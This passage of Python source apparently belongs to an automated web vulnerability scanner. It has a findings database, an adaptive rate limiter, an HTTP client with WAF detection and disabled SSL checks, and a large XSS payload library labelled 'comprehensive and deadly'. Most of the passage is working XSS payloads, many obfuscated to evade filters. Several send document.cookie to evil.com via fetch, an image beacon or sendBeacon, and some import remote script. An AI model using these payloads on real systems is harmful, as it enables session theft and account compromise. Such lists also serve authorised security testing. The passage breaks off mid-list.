        """Get all findings, optionally filtered by target."""
        if target:
            rows = self.conn.execute(
                "SELECT * FROM findings WHERE target=? ORDER BY severity DESC, confidence DESC",
                (target,)
            ).fetchall()
        else:
            rows = self.conn.execute(
                "SELECT * FROM findings ORDER BY severity DESC, confidence DESC"
            ).fetchall()
        
        return [dict(row) for row in rows]
    
    def get_findings_by_type(self, vuln_type: str) -> List[Dict]:
        """Get findings of specific vulnerability type."""
        rows = self.conn.execute(
            "SELECT * FROM findings WHERE vuln_type=? ORDER BY severity DESC",
            (vuln_type,)
        ).fetchall()
        return [dict(row) for row in rows]
    
    def close(self):
        """Close database connection cleanly."""
        self.conn.commit()
        self.conn.execute("PRAGMA optimize")
        self.conn.close()

# ═══════════════════════════════════════════════════════════════════════════════════════
# RATE LIMITER — ADAPTIVE WITH DOMAIN-AWARE THROTTLING
# ═══════════════════════════════════════════════════════════════════════════════════════

class AdaptiveRateLimiter:
    """
    Multi-domain rate limiter with:
    - Per-domain rate tracking
    - Automatic backoff on WAF/rate limit detection
    - Queue prioritization for critical endpoints
    """
    
    def __init__(self, base_delay: float = 2.0):
        self.base_delay = base_delay
        self.domain_rates = defaultdict(lambda: {
            'delay': base_delay,
            'failures': 0,
            'last_request': 0,
            'rate_limited': False,
            'rate_limit_until': None
        })
        self.global_lock = threading.Lock()
        self.domain_locks = defaultdict(threading.Lock)
    
    def _get_domain(self, url: str) -> str:
        """Extract domain from URL."""
        try:
            return urlparse(url).netloc
        except Exception:
            return url
    
    async def wait(self, url: str):
        """Wait appropriate time before next request to domain."""
        domain = self._get_domain(url)
        
        with self.domain_locks[domain]:
            rate_info = self.domain_rates[domain]
            
            # Check if domain is rate limited
            if rate_info['rate_limited']:
                if rate_info['rate_limit_until'] and datetime.now() < rate_info['rate_limit_until']:
                    wait_time = (rate_info['rate_limit_until'] - datetime.now()).total_seconds()
                    await asyncio.sleep(min(wait_time, 60))
                else:
                    rate_info['rate_limited'] = False
            
            now = time.monotonic()
            elapsed = now - rate_info['last_request']
            
            if elapsed < rate_info['delay']:
                await asyncio.sleep(rate_info['delay'] - elapsed)
            
            rate_info['last_request'] = time.monotonic()
    
    def report_success(self, url: str):
        """Report successful request — reduce backoff."""
        domain = self._get_domain(url)
        
        with self.domain_locks[domain]:
            rate_info = self.domain_rates[domain]
            rate_info['failures'] = max(0, rate_info['failures'] - 1)
            rate_info['delay'] = max(self.base_delay, rate_info['delay'] * 0.95)
    
    def report_failure(self, url: str):
        """Report failed request — increase backoff."""
        domain = self._get_domain(url)
        
        with self.domain_locks[domain]:
            rate_info = self.domain_rates[domain]
            rate_info['failures'] += 1
            rate_info['delay'] = min(30.0, self.base_delay * (1.5 ** rate_info['failures']))
    
    def report_rate_limit(self, url: str, duration: int = 300):
        """Report rate limit detection — pause for duration seconds."""
        domain = self._get_domain(url)
        
        with self.domain_locks[domain]:
            rate_info = self.domain_rates[domain]
            rate_info['rate_limited'] = True
            rate_info['rate_limit_until'] = datetime.now() + timedelta(seconds=duration)
            rate_info['delay'] = max(rate_info['delay'], 10.0)

# ═══════════════════════════════════════════════════════════════════════════════════════
# SESSION MANAGER — ROBUST HTTP CLIENT
# ═══════════════════════════════════════════════════════════════════════════════════════

class SessionManager:
    """Async HTTP session with retry logic, WAF detection, and response caching."""
    
    def __init__(self, config: Config):
        self.config = config
        self.session = None
        self.semaphore = asyncio.Semaphore(config.workers)
        self.rate_limiter = AdaptiveRateLimiter(config.rate_limit)
        self.response_cache = OrderedDict()
        self.cache_max = 1000
        self.stats = Counter()
    
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(
            limit=0,
            ssl=False,
            force_close=True,
            enable_cleanup_closed=True,
            ttl_dns_cache=300
        )
        timeout = aiohttp.ClientTimeout(
            total=self.config.timeout,
            connect=10,
            sock_read=15
        )
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            cookie_jar=aiohttp.CookieJar(unsafe=True),
            headers=get_headers(self.config)
        )
        return self
    
    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()
    
    def _cache_key(self, url: str, method: str = 'GET', headers: Dict = None) -> str:
        """Generate cache key."""
        key = f"{method}:{url}"
        if headers:
            key += ':' + hashlib.md5(str(sorted(headers.items())).encode()).hexdigest()[:8]
        return key
    
    async def fetch(self, url: str, **kwargs) -> Dict:
        """Fetch URL with retry, caching, and rate limiting."""
        cache_key = self._cache_key(url, kwargs.get('method', 'GET'), kwargs.get('headers'))
        
        # Check cache (only for GET requests without custom headers)
        if kwargs.get('method', 'GET') == 'GET' and not kwargs.get('headers'):
            cached = self.response_cache.get(cache_key)
            if cached:
                self.stats['cache_hits'] += 1
                return cached
        
        async with self.semaphore:
            await self.rate_limiter.wait(url)
            
            headers = get_headers(self.config)
            if 'headers' in kwargs:
                headers.update(kwargs.pop('headers'))
            
            method = kwargs.pop('method', 'GET').upper()
            
            start_time = time.monotonic()
            last_error = None
            
            for attempt in range(self.config.max_retries + 1):
                try:
                    if method == 'GET':
                        async with self.session.get(url, headers=headers, **kwargs) as resp:
                            text = await resp.text()
                            elapsed = time.monotonic() - start_time
                            
                            result = {
                                'status': resp.status,
                                'text': text,
                                'url': str(resp.url),
                                'headers': dict(resp.headers),
                                'cookies': {k: v.value for k, v in resp.cookies.items()},
                                'size': len(text),
                                'response_time': elapsed,
                                'waf': WAFDetector.detect({
                                    'status': resp.status,
                                    'text': text,
                                    'headers': dict(resp.headers),
                                    'cookies': {k: v.value for k, v in resp.cookies.items()}
                                }),
                                'attempt': attempt + 1
                            }
                            
                            self.rate_limiter.report_success(url)
                            self.stats['requests'] += 1
                            
                            # Cache GET responses
                            if resp.status == 200 and not kwargs.get('headers'):
                                self._cache_response(cache_key, result)
                            
                            return result
                    
                    elif method == 'POST':
                        async with self.session.post(url, headers=headers, **kwargs) as resp:
                            text = await resp.text()
                            elapsed = time.monotonic() - start_time
                            
                            result = {
                                'status': resp.status,
                                'text': text,
                                'url': str(resp.url),
                                'headers': dict(resp.headers),
                                'size': len(text),
                                'response_time': elapsed,
                                'waf': WAFDetector.detect({
                                    'status': resp.status,
                                    'text': text,
                                    'headers': dict(resp.headers)
                                }),
                                'attempt': attempt + 1
                            }
                            
                            self.rate_limiter.report_success(url)
                            self.stats['requests'] += 1
                            return result
                
                except asyncio.TimeoutError:
                    last_error = "Timeout"
                    self.rate_limiter.report_failure(url)
                    if attempt < self.config.max_retries:
                        await asyncio.sleep(2 ** attempt)
                
                except aiohttp.ClientError as e:
                    last_error = str(e)
                    self.rate_limiter.report_failure(url)
                    if attempt < self.config.max_retries:
                        await asyncio.sleep(2 ** attempt)
                
                except Exception as e:
                    last_error = str(e)
                    break
            
            self.stats['failures'] += 1
            return {
                'status': 0,
                'text': '',
                'url': url,
                'headers': {},
                'size': 0,
                'response_time': time.monotonic() - start_time,
                'error': last_error,
                'waf': None,
                'attempt': self.config.max_retries + 1
            }
    
    def _cache_response(self, key: str, response: Dict):
        """Cache response with LRU eviction."""
        if key in self.response_cache:
            del self.response_cache[key]
        
        self.response_cache[key] = response
        
        while len(self.response_cache) > self.cache_max:
            self.response_cache.popitem(last=False)

# ═══════════════════════════════════════════════════════════════════════════════════════
# PAYLOAD LIBRARIES — COMPREHENSIVE & DEADLY
# ═══════════════════════════════════════════════════════════════════════════════════════

class PayloadLibrary:
    """Massive payload collection — organized by vulnerability type."""
    
    # ─── XSS Payloads — 100+ vectors ──────────────────────────────────────
    XSS_PAYLOADS = [
        # ==================== 1-50: BASIC VECTORS ====================
        '<script>alert(1)</script>',
        '<script>alert(document.domain)</script>',
        '<script>alert(document.cookie)</script>',
        '<script>alert(window.location)</script>',
        '<script>alert(location.hash)</script>',
        '<script>confirm(1)</script>',
        '<script>prompt(1)</script>',
        '<script>console.log(1)</script>',
        '<script>console.error(1)</script>',
        '<script>console.warn(1)</script>',
        '<script>document.write(1)</script>',
        '<script>document.writeln(1)</script>',
        '<script>eval("alert(1)")</script>',
        '<script>Function("alert(1)")()</script>',
        '<script>setTimeout("alert(1)",0)</script>',
        '<script>setInterval("alert(1)",1000)</script>',
        '<script>new Function("alert(1)")()</script>',
        '<script>window.onload=function(){alert(1)}</script>',
        '<script>document.body.onload=alert(1)</script>',
        '<script>location.href="javascript:alert(1)"</script>',
        '<script>top.alert(1)</script>',
        '<script>parent.alert(1)</script>',
        '<script>self.alert(1)</script>',
        '<script>frames[0].alert(1)</script>',
        '<script>opener.alert(1)</script>',
        '<script>this.alert(1)</script>',
        '<script>valueOf(alert(1))</script>',
        '<script>toString(alert(1))</script>',
        '<script>constructor.constructor("alert(1)")()</script>',
        '<script>[].map.constructor("alert(1)")()</script>',
        '<script>Object.constructor("alert(1)")()</script>',
        '<script>Array.constructor("alert(1)")()</script>',
        '<script>String.constructor("alert(1)")()</script>',
        '<script>Number.constructor("alert(1)")()</script>',
        '<script>Boolean.constructor("alert(1)")()</script>',
        '<script>RegExp.constructor("alert(1)")()</script>',
        '<script>Date.constructor("alert(1)")()</script>',
        '<script>Function.constructor("alert(1)")()</script>',
        '<script>window["alert"](1)</script>',
        '<script>self["alert"](1)</script>',
        '<script>top["alert"](1)</script>',
        '<script>parent["alert"](1)</script>',
        '<script>frames["alert"](1)</script>',
        '<script>opener["alert"](1)</script>',
        '<script>this["alert"](1)</script>',
        '<script>window["al"+"ert"](1)</script>',
        '<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>',
        '<script>window[atob("YWxlcnQ=")](1)</script>',
        '<script>window[/alert/.source](1)</script>',
        '<script>window[`${"alert"}`](1)</script>',
        
        # ==================== 51-120: IMG VECTORS (70) ====================
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert(document.domain)>',
        '<img src=x onerror=alert(document.cookie)>',
        '<img src=x onerror=confirm(1)>',
        '<img src=x onerror=prompt(1)>',
        '<img src=1 onerror=alert(1)>',
        '<img src=javascript:alert(1) onerror=alert(1)>',
        '<img src=x onerror=this.onerror=null;alert(1)>',
        '<img src=x onerror=eval("alert(1)")>',
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        '<img src=x onerror=Function("alert(1)")()>',
        '<img src=x onerror=setTimeout("alert(1)",0)>',
        '<img src=x onerror=setInterval("alert(1)",0)>',
        '<img src=x onerror=location="javascript:alert(1)">',
        '<img src=x onerror=window["alert"](1)>',
        '<img src=x onerror=self["alert"](1)>',
        '<img src=x onerror=top["alert"](1)>',
        '<img src=x onerror=parent["alert"](1)>',
        '<img src=x onerror=opener["alert"](1)>',
        '<img src=x onerror=frames[0]["alert"](1)>',
        '<img src=x onerror="alert(1)">',
        '<img src=x onerror=alert(1) >',
        '<img src=x onerror=alert(1)//',
        '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
        '<img src=x onerror="\x61\x6c\x65\x72\x74\x28\x31\x29">',
        '<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">',
        '<img src=x onerror="\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29">',
        '<img src=x onerror="eval(\x61\x6c\x65\x72\x74\x28\x31\x29)">',
        '<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
        '<img src=x onerror="top[`al`+`ert`](1)">',
        '<img src=x onerror="self[`al`+`ert`](1)">',
        '<img src=x onerror="parent[`al`+`ert`](1)">',
        '<img src=x onerror="window[`al`+`ert`](1)">',
        '<img src=x onerror="[][`fil`+`ter`][`constru`+`ctor`](`al`+`ert(1)`)()">',
        '<img src=x onerror="[][\x66\x69\x6c\x74\x65\x72][\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72](\x61\x6c\x65\x72\x74(1))()">',
        '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
        '<img src=x onerror="eval(atob(\'dmFyIGE9J2FsZXJ0KDEpJztldmFsKGEp\'))">',
        '<img src=x onerror="import(\'//evil.com/xss.js\')">',
        '<img src=x onerror="fetch(\'//evil.com/?c=\'+document.cookie)">',
        '<img src=x onerror="new Image().src=\'//evil.com/?c=\'+document.cookie">',
        '<img src=x onerror="navigator.sendBeacon(\'//evil.com/\',document.cookie)">',
        '<img/src=x/onerror=alert(1)>',
        '<img/src="x"/onerror="alert(1)">',
        '<img%0dsrc=x%0donerror=alert(1)>',
        '<img%0asrc=x%0aonerror=alert(1)>',
        '<img%09src=x%09onerror=alert(1)>',
        '<img%0d%0asrc=x%0d%0aonerror=alert(1)>',
        '<img%00src=x%00onerror=alert(1)>',
        '<img src=x onerror=\x61\x6c\x65\x72\x74(1)>',
        '<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>',
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>',
        '<img src=x onerror=alert`1`>',
        '<img src=x onerror=alert.call`${1}`>',
        '<img src=x onerror=alert.apply`${1}`>',
        '<img src=x onerror=Function`a${"alert(1)"}a```>',
        '<img src=x onerror=setTimeout`alert\x281\x29`>',
        '<img src=x onerror=setInterval`alert\x281\x29`>',
        '<img src=xyz onerror=alert(1)>',
        '<img src=1 onerror=confirm(1)>',
        '<img src=1 onerror=prompt(1)>',
        '<img src=http://invalid.com/invalid.jpg onerror=alert(1)>',
        '<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+>',
        '<img src=data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E%3C/svg%3E>',
        
        # ==================== 121-180: SVG VECTORS (60) ====================
        '<svg onload=alert(1)>',
        '<svg onload=alert(document.domain)>',
        '<svg onload=alert(document.cookie)>',
        '<svg onload=confirm(1)>',
        '<svg onload=prompt(1)>',
        '<svg/onload=alert(1)>',
        '<svg onload=alert(1)//',
        '<svg onload="alert(1)">',
        '<svg onload=alert(1) >',
        '<svg onload=eval("alert(1)")>',
        '<svg onload=Function("alert(1)")()>',
        '<svg onload=setTimeout("alert(1)",0)>',
        '<svg><script>alert(1)</script></svg>',
        '<svg><script>alert(document.domain)</script></svg>',
        '<svg><script>confirm(1)</script></svg>',
        '<svg><script>prompt(1)</script></svg>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<svg><animate onbegin=confirm(1) attributeName=x dur=1s>',
        '<svg><animate onbegin=prompt(1) attributeName=x dur=1s>',
        '<svg><animate onrepeat=alert(1) attributeName=x dur=1s>',
        '<svg><set onbegin=alert(1) attributeName=x>',
        '<svg><set onbegin=confirm(1) attributeName=x>',
        '<svg><set onbegin=prompt(1) attributeName=x>',
        '<svg><set onrepeat=alert(1) attributeName=x>',
        '<svg><discard onbegin=alert(1)>',
        '<svg><handler onactivate=alert(1)>',
        '<svg><handler onload=alert(1)>',
        '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="javascript:alert(1)"></iframe></body></foreignObject></svg>',
        '<svg><use href="data:image/svg+xml,<svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\'><image href=\'1\' onerror=\'alert(1)\' /></svg>#x"></use></svg>',
        '<svg><use href="//evil.com/evil.svg#x"></use></svg>',
        '<svg><use href="evil.svg#x"></use></svg>',
        '<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100%" height="100%" fill="red"/></a></svg>',
        '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><animate attributeName="href" values="javascript:alert(1)"/><text><a><set attributeName="href" to="javascript:alert(1)"/></a></text></svg>',
        '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><rect width="100%" height="100%" fill="red"/></a></svg>',
        '<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"><polygon id="x" points="0,0 0,0 0,0" onmouseover="alert(1)"/>',
        '<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50" fill="red" onmouseover="alert(1)"/>',
        '<svg width="100%" height="100%" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><rect x="0" y="0" width="100" height="100" fill="red" onclick="alert(1)"/>',
        '<svg><style>@keyframes x{}</style><rect style="animation:x 1s" onanimationstart=alert(1)>',
        '<svg><style>@keyframes x{}</style><rect style="animation:x 1s" onanimationiteration=alert(1)>',
        '<svg><style>@keyframes x{}</style><rect style="animation:x 1s" onanimationend=alert(1)>',
        '<svg><style>@keyframes x{from{opacity:1}to{opacity:0}}</style><rect style="animation:x 1s" onanimationstart="alert(1)">',
        '<svg><animateTransform onbegin="alert(1)" attributeName="transform" type="rotate" from="0 0 0" to="360 0 0" dur="1s"/>',
        '<svg><animateMotion onbegin="alert(1)" path="M0,0 L100,100" dur="1s"/>',
        '<svg><audio onloadstart="alert(1)"><source src="invalid.ogg"/></audio></svg>',
        '<svg><video onloadstart="alert(1)"><source src="invalid.mp4"/></video></svg>',
        '<svg><iframe onload="alert(1)" src="about:blank"/></svg>',
        '<svg><iframe srcdoc="<script>alert(1)</script>"/>',
        '<svg><embed src="javascript:alert(1)"/>',
        '<svg><a><animate attributeName="href" values="javascript:alert(1)"/></a></svg>',
        '<svg><set attributeName="href" to="javascript:alert(1)"/><a>click</a></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><script>window.parent.alert(1)</script></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><script>window.top.alert(1)</script></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><script>window.self.alert(1)</script></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><script>window.opener.alert(1)</script></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><script>window.frames[0].alert(1)</script></svg>',
        
        # ==================== 181-230: BODY/IFRAME/VARIOUS TAGS (50) ====================
        '<body onload=alert(1)>',
        '<body onpageshow=alert(1)>',
        '<body onfocus=alert(1)>',
        '<body onblur=alert(1)>',
        '<body onhashchange=alert(1)>',
        '<body onpopstate=alert(1)>',
        '<body onresize=alert(1)>',
        '<body onscroll=alert(1)>',
        '<body onzoom=alert(1)>',
        '<html onload=alert(1)>',
        '<html onpageshow=alert(1)>',
        '<iframe onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<iframe src="data:text/html,<script>alert(1)</script>">',
        '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        '<iframe src="about:blank" onload="alert(1)">',
        '<iframe onload="alert(document.domain)">',
        '<iframe onload="alert(document.cookie)">',
        '<iframe onload="confirm(1)">',
        '<iframe onload="prompt(1)">',
        '<frameset onload=alert(1)>',
        '<frame src="javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<embed src="data:image/svg+xml,%3Csvg onload=alert(1)%3E%3C/svg%3E">',
        '<applet code="javascript:alert(1)">',
        '<base href="javascript:alert(1)//">',
        '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<meta charset="x-imap4-modified-utf7">&+AHw-script+AD4-alert(1)+ADw-/script+AD4-',
        '<link rel=stylesheet href="javascript:alert(1)">',
        '<link rel="import" href="data:text/html,<script>alert(1)</script>">',
        '<link rel="import" href="//evil.com/xss.html">',
        '<style onload=alert(1)>',
        '<style>@import "javascript:alert(1)";</style>',
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '<style>*{background:url("javascript:alert(1)")}</style>',
        '<style>input[type="password"]{background:url("//evil.com/?"+document.cookie)}</style>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<audio><source onerror=alert(1)>',
        '<track onload=alert(1) src="invalid">',
        '<source src="invalid" onerror=alert(1)>',
        '<picture><source srcset="invalid" onerror=alert(1)><img src="x"></picture>',
        '<portal src="javascript:alert(1)">',
        '<portal src="data:text/html,<script>alert(1)</script>">',
        '<math><mtext><mglyph><style><!--</style><img src=x onerror=alert(1)>',
        '<math><mtext><img src=x onerror=alert(1)>',
        
        # ==================== 231-280: INPUT/FORM/EVENT VECTORS (50) ====================
        '<input onfocus=alert(1) autofocus>',
        '<input onfocus=alert(1) onblur=alert(1) autofocus>',
        '<input onblur=alert(1) autofocus>',
        '<input onchange=alert(1) autofocus>',
        '<input oninput=alert(1) autofocus>',
        '<input onselect=alert(1) autofocus>',
        '<input type="text" onfocus=alert(1) autofocus>',
        '<input type="password" onfocus=alert(1) autofocus>',
        '<input type="hidden" onfocus=alert(1) autofocus>',
        '<input type="button" value="XSS" onclick=alert(1)>',
        '<input type="submit" value="XSS" onclick=alert(1)>',
        '<input type="reset" value="XSS" onclick=alert(1)>',
        '<input type="image" src=x onerror=alert(1)>',
        '<input type="image" src="javascript:alert(1)">',
        '<input type="file" onfocus=alert(1) autofocus>',
        '<input type="range" onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<select onchange=alert(1) autofocus>',
        '<option onmouseover=alert(1)>XSS</option>',
        '<option onfocus=alert(1)>XSS</option>',
        '<textarea onfocus=alert(1) autofocus></textarea>',
        '<textarea onblur=alert(1) autofocus></textarea>',
        '<textarea onchange=alert(1) autofocus></textarea>',
        '<textarea oninput=alert(1) autofocus></textarea>',
        '<textarea onselect=alert(1) autofocus></textarea>',
        '<button onclick=alert(1)>XSS</button>',
        '<button onfocus=alert(1) autofocus>XSS</button>',
        '<button onmouseover=alert(1)>XSS</button>',
        '<button onmouseout=alert(1)>XSS</button>',
        '<button onmousedown=alert(1)>XSS</button>',
        '<button onmouseup=alert(1)>XSS</button>',
        '<button ondblclick=alert(1)>XSS</button>',
        '<button oncontextmenu=alert(1)>XSS</button>',
        '<details open ontoggle=alert(1)>',
        '<details ontoggle=alert(1)>',
        '<details open onopen=alert(1)>',
        '<summary onclick=alert(1)>XSS</summary>',
        '<marquee onstart=alert(1)>XSS</marquee>',
        '<marquee onfinish=alert(1)>XSS</marquee>',
        '<marquee loop=1 onbounce=alert(1)>XSS</marquee>',
        '<marquee onstart=confirm(1)>XSS</marquee>',
        '<marquee onstart=prompt(1)>XSS</marquee>',
        '<label onfocus=alert(1) autofocus>XSS</label>',
        '<label onmouseover=alert(1)>XSS</label>',
        '<label onclick=alert(1)>XSS</label>',
        '<legend onmouseover=alert(1)>XSS</legend>',
        '<fieldset onmouseover=alert(1)>XSS</fieldset>',
        '<form onsubmit=alert(1)><input type=submit></form>',
        '<form onreset=alert(1)><input type=reset></form>',
        '<form action="javascript:alert(1)"><input type=submit></form>',
        
        # ==================== 281-330: JAVASCRIPT/DATA PROTOCOLS (50) ====================
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        'javascript:alert(document.cookie)',
        'javascript:confirm(1)',
        'javascript:prompt(1)',
        'javascript:void(alert(1))',
        'javascript:alert(1)//',
        'javascript:/* */alert(1)',
        'javascript:alert`1`',
        'javascript:alert(1)%0D%0A',
        'javascript:alert(1)%0A',
        'javascript:alert(1);',
        'javascript:alert(1)?',
        'javascript:alert(1)#',
        'javascript:alert(1):',
        'javascript:this.alert(1)',
        'javascript:window.alert(1)',
        'javascript:top.alert(1)',
        'javascript:parent.alert(1)',
        'javascript:self.alert(1)',
        'javascript:opener.alert(1)',
        'javascript:frames[0].alert(1)',
        'javascript:eval("alert(1)")',
        'javascript:Function("alert(1)")()',
        'javascript:setTimeout("alert(1)",0)',
        'javascript:setInterval("alert(1)",0)',
        'javascript:location="javascript:alert(1)"',
        'javascript:document.write("XSS")',
        'javascript:alert(document.domain)',
        'javascript:alert(window.location)',
        'javascript:alert(location.hash)',
        'j&#x61;v&#x61;script:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'data:text/html;charset=utf-8,<script>alert(1)</script>',
        'data:application/javascript,alert(1)',
        'data:application/javascript;base64,YWxlcnQoMSk=',
        'data:image/svg+xml,<svg onload=alert(1)>',
        'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+',
        
        # ==================== 331-400: EVENT HANDLERS (70) ====================
        '" onmouseover=alert(1) x="',
        "' onmouseover=alert(1) x='",
        '" onmouseout=alert(1) x="',
        '" onmousemove=alert(1) x="',
        '" onmousedown=alert(1) x="',
        '" onmouseup=alert(1) x="',
        '" onmouseenter=alert(1) x="',
        '" onmouseleave=alert(1) x="',
        '" onmousewheel=alert(1) x="',
        '" onclick=alert(1) x="',
        '" ondblclick=alert(1) x="',
        '" oncontextmenu=alert(1) x="',
        '" onkeypress=alert(1) x="',
        '" onkeydown=alert(1) x="',
        '" onkeyup=alert(1) x="',
        '" onfocus=alert(1) autofocus x="',
        '" onblur=alert(1) autofocus x="',
        '" onfocusin=alert(1) x="',
        '" onfocusout=alert(1) x="',
        '" onchange=alert(1) x="',
        '" oninput=alert(1) x="',
        '" onselect=alert(1) x="',
        '" onsubmit=alert(1) x="',
        '" onreset=alert(1) x="',
        '" onload=alert(1) x="',
        '" onunload=alert(1) x="',
        '" onpageshow=alert(1) x="',
        '" onpagehide=alert(1) x="',
        '" onresize=alert(1) x="',
        '" onscroll=alert(1) x="',
        '" onhashchange=alert(1) x="',
        '" onpopstate=alert(1) x="',
        '" onbeforeunload=alert(1) x="',
        '" onerror=alert(1) x="',
        '" onabort=alert(1) x="',
        '" oncanplay=alert(1) x="',
        '" oncanplaythrough=alert(1) x="',
        '" ondurationchange=alert(1) x="',
        '" onemptied=alert(1) x="',
        '" onended=alert(1) x="',
        '" onloadeddata=alert(1) x="',
        '" onloadedmetadata=alert(1) x="',
        '" onloadstart=alert(1) x="',
        '" onpause=alert(1) x="',
        '" onplay=alert(1) x="',
        '" onplaying=alert(1) x="',
        '" onprogress=alert(1) x="',
        '" onratechange=alert(1) x="',
        '" onseeked=alert(1) x="',
        '" onseeking=alert(1) x="',
        '" onstalled=alert(1) x="',
        '" onsuspend=alert(1) x="',
        '" ontimeupdate=alert(1) x="',
        '" onvolumechange=alert(1) x="',
        '" onwaiting=alert(1) x="',
        '" ontoggle=alert(1) x="',
        '" onopen=alert(1) x="',
        '" onmessage=alert(1) x="',
        '" onclose=alert(1) x="',
        '" onshow=alert(1) x="',
        '" onactivate=alert(1) x="',
        '" onbeforeactivate=alert(1) x="',
        '" onbeforedeactivate=alert(1) x="',
        '" onbeforeeditfocus=alert(1) x="',
        '" onbeforepaste=alert(1) x="',
        '" oncontrolselect=alert(1) x="',
        '" oncopy=alert(1) x="',
        '" oncut=alert(1) x="',
        '" ondeactivate=alert(1) x="',
        '" ondrag=alert(1) x="',
        '" ondragend=alert(1) x="',
        
        # ==================== 401-450: MORE EVENT HANDLERS (50) ====================
        '" ondragenter=alert(1) x="',
        '" ondragleave=alert(1) x="',
        '" ondragover=alert(1) x="',
        '" ondragstart=alert(1) x="',
        '" ondrop=alert(1) x="',
        '" onhelp=alert(1) x="',
        '" onlosecapture=alert(1) x="',
        '" onmove=alert(1) x="',
        '" onpropertychange=alert(1) x="',
        '" onreadystatechange=alert(1) x="',
        '" onrowenter=alert(1) x="',
        '" onrowexit=alert(1) x="',
        '" onselectstart=alert(1) x="',
        '" onstop=alert(1) x="',
        '" onstart=alert(1) x="',
        '" ontouchstart=alert(1) x="',
        '" ontouchend=alert(1) x="',
        '" ontouchmove=alert(1) x="',
        '" ontouchcancel=alert(1) x="',
        '" ongesturestart=alert(1) x="',
        '" ongesturechange=alert(1) x="',
        '" ongestureend=alert(1) x="',
        '" ontouchstart=confirm(1) x="',
        '" ontouchstart=prompt(1) x="',
        '" ontouchend=confirm(1) x="',
        '" onmouseover=alert(document.cookie) x="',
        '" onmouseover=alert(document.domain) x="',
        '" onmouseover=confirm(1) x="',
        '" onmouseover=prompt(1) x="',
        '" onfocus=alert(1) x="',
        '" onfocus=confirm(1) x="',
        '" onfocus=prompt(1) x="',
        '" onclick=alert(1) x="',
        '" onclick=confirm(1) x="',
        '" onclick=prompt(1) x="',
        '" onload=alert(1) x="',
        '" onload=confirm(1) x="',
        '" onerror=alert(1) x="',
        '" onerror=confirm(1) x="',
        '" onkeydown=alert(1) x="',
        '" onkeyup=alert(1) x="',
        '" onkeypress=alert(1) x="',
        '" onchange=alert(1) x="',
        '" oninput=alert(1) x="',
        '" onselect=alert(1) x="',
        '" onsubmit=alert(1) x="',
        '" onreset=alert(1) x="',
        '" onresize=alert(1) x="',
        '" onscroll=alert(1) x="',
        '" onhashchange=alert(1) x="',
        
        # ==================== 451-520: OBFUSCATED/ENCODED PAYLOADS (70) ====================
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
        '<scr<script>ipt>confirm(1)</scr</script>ipt>',
        '<scr<script>ipt>prompt(1)</scr</script>ipt>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<ScRiPt>alert(document.domain)</ScRiPt>',
        '<SCRIPT>confirm(1)</SCRIPT>',
        '<ScRiPt>prompt(1)</ScRiPt>',
        '<<script>alert(1)//<</script>',
        '<<ScRiPt>alert(1)//<</ScRiPt>',
        '<script>alert(1)</script>',
        '<script>alert`1`</script>',
        '<script>alert.call`${1}`</script>',
        '<script>alert.apply`${1}`</script>',
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<script>Function("alert(1)")()</script>',
